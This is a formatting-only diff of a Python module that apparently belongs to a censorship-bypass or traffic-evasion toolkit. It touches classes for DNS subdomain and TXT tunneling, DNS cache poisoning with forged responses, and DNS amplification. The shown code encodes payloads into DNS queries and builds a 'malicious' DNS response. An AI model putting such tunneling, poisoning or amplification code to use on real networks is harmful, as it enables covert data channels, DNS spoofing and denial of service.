@@ -16,6 +16,7 @@ from core.bypass.attacks.base import (
 )
 from core.bypass.attacks.attack_registry import register_attack
 
+
 def _safe_create_result(status_name: str, **kwargs):
     """Safely create AttackResult to prevent AttackStatus errors."""
     try:
@@ -60,8 +61,7 @@ class DNSSubdomainTunnelingAttack(BaseAttack):
 
     @property
     def optional_params(self) -> Dict[str, Any]:
-        return {'domain': 'example.com', 'encoding': 'base32'}
-
+        return {"domain": "example.com", "encoding": "base32"}
 
     def execute(self, context: AttackContext) -> AttackResult:
         """Execute DNS subdomain tunneling attack."""
@@ -71,9 +71,7 @@ class DNSSubdomainTunnelingAttack(BaseAttack):
             base_domain = context.params.get("base_domain", "example.com")
             encoding_type = context.params.get("encoding_type", "base32")
             max_subdomain_length = context.params.get("max_subdomain_length", 63)
-            encoded_chunks = self._encode_for_dns(
-                payload, encoding_type, max_subdomain_length
-            )
+            encoded_chunks = self._encode_for_dns(payload, encoding_type, max_subdomain_length)
             dns_queries = []
             for i, chunk in enumerate(encoded_chunks):
                 subdomain = f"{chunk}.{i}.{base_domain}"
@@ -107,9 +105,7 @@ class DNSSubdomainTunnelingAttack(BaseAttack):
                 latency_ms=(time.time() - start_time) * 1000,
             )
 
-    def _encode_for_dns(
-        self, data: bytes, encoding_type: str, max_length: int
-    ) -> List[str]:
+    def _encode_for_dns(self, data: bytes, encoding_type: str, max_length: int) -> List[str]:
         """Encode data for DNS tunneling."""
         if encoding_type == "base32":
             encoded = base64.b32encode(data).decode("ascii").lower().rstrip("=")
@@ -181,8 +177,7 @@ class DNSTXTTunnelingAttack(BaseAttack):
 
     @property
     def optional_params(self) -> Dict[str, Any]:
-        return {'domain': 'example.com', 'chunk_size': 255}
-
+        return {"domain": "example.com", "chunk_size": 255}
 
     def execute(self, context: AttackContext) -> AttackResult:
         """Execute DNS TXT tunneling attack."""
@@ -280,8 +275,7 @@ class DNSCachePoisoningAttack(BaseAttack):
 
     @property
     def optional_params(self) -> Dict[str, Any]:
-        return {'target_domain': 'example.com', 'fake_ip': '1.2.3.4'}
-
+        return {"target_domain": "example.com", "fake_ip": "1.2.3.4"}
 
     def execute(self, context: AttackContext) -> AttackResult:
         """Execute DNS cache poisoning attack."""
@@ -290,9 +284,7 @@ class DNSCachePoisoningAttack(BaseAttack):
             payload = context.payload
             target_domain = context.params.get("target_domain", "blocked-site.com")
             redirect_ip = context.params.get("redirect_ip", "127.0.0.1")
-            dns_response = self._create_malicious_dns_response(
-                target_domain, redirect_ip
-            )
+            dns_response = self._create_malicious_dns_response(target_domain, redirect_ip)
             segments = [(dns_response, 0)]
             packets_sent = 1
             bytes_sent = len(dns_response)
@@ -386,8 +378,7 @@ class DNSAmplificationAttack(BaseAttack):
 
     @property
     def optional_params(self) -> Dict[str, Any]:
-        return {'amplification_factor': 10}
-
+        return {"amplification_factor": 10}
 
     def execute(self, context: AttackContext) -> AttackResult:
         """Execute DNS amplification attack."""
@@ -395,9 +386,7 @@ class DNSAmplificationAttack(BaseAttack):
         try:
             payload = context.payload
             amplification_factor = context.params.get("amplification_factor", 5)
-            query_types = context.params.get(
-                "query_types", ["A", "AAAA", "MX", "TXT", "NS"]
-            )
+            query_types = context.params.get("query_types", ["A", "AAAA", "MX", "TXT", "NS"])
             dns_queries = []
             for i in range(amplification_factor):
                 query_type = random.choice(query_types)
